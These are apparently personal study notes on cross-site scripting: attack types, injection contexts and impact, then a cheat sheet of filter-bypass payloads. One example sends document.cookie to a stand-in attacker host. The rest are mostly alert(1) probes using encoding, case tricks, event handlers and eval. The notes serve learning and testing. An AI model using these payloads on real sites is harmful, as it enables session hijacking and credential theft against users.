# Cyber-Security-Notes

# Cross-Site Scripting (XSS) Notes

## 1. What is XSS? 
It's a vulnerability that lets you inject malicious JavaScript code into a website. The site then displays or executes this code as if it were a natural part of the content.

## 2. Types of XSS

Reflected XSS: The script is reflected off the web server, such as in an error message or search result. It runs immediately when the victim clicks a specially crafted link (often through URL parameters).

Stored XSS (Persistent): The most dangerous type. The script is permanently stored on the target server (e.g., in a database, in a comment field, or user profile). It executes every time any user views the affected page.

DOM-based XSS: The vulnerability exists in client-side code rather than server-side code. The script doesn't necessarily go through the server; it is executed by modifying the "Document Object Model" (DOM) in the victim's browser.

## 3. Context Matters (Where is the Injection?) The payload depends entirely on where the input lands:

Inside Tags: e.g.,``` <div>[Payload]</div>```

Inside Attributes: e.g., ```<input value="[Payload]">```

Inside JavaScript: e.g., ```var name = '[Payload]';```

## 4. Beyond alert(1): Real-World Impact
XSS is not just about popping up an alert box. In a real attack, an attacker can use XSS to:

Steal Session Cookies: By accessing document.cookie, an attacker can hijack a user's session and log into their account without a password.

Keylogging: Record everything the user types on the page.

Phishing: Inject fake login forms to steal credentials.

 Cookie Stealing Payload Example:

<script>
  fetch('https://attacker-server.com/steal?cookie=' + document.cookie);
</script>

## 5. Payloads & Bypasses:
 . Basic Bypass Payloads

```"><script>alert(1)</script>```
```"><img src=x onerror=alert(1)>```
```'><svg onload=alert(1)>```
```"><iframe src=javascript:alert(1)>```
```"><body onload=alert(1)>```

. Using HTML Entities

```"><script>alert&#40;1&#41;</script>```
```"><img src=x onerror=alert&#40;1&#41;>```
```"><svg onload=&#97;lert(1)>```



. Unicode Bypass

```"><script>\u0061lert(1)</script>```
```"><img src=x onerror="\u0061lert(1)">```

. Breaking Out of Attributes

```"><img src=x onerror=alert(1)>```
```" onmouseover=alert(1) a="```
```' onfocus=alert(1) x='```
```javascript:alert(1)```

. Case and Space Obfuscation

```"><ScRiPt>alert(1)</ScRiPt>```
```"><script >alert(1)</script>```
```"><script>alert(1)//</script>```


. Using Event Handlers

```"><div onpointerdown=alert(1)>CLICK</div>```
```"><video autoplay onplay=alert(1)>```
```"><details open ontoggle=alert(1)>```
```"><marquee onstart=alert(1)>```




. Indirect JavaScript Execution


```"><script>eval('alert(1)')</script>```
```"><script>Function('alert(1)')()</script```>
```"><script>setTimeout('alert(1)',100)</script>```
```"><script>new Function`alert(1)`</script>```


 . Using srcdoc, data: & iframe

```<iframe srcdoc="<script>alert(1)</script>"></iframe>```
```<iframe src="data:text/html,<script>alert(1)</script>"></iframe>```
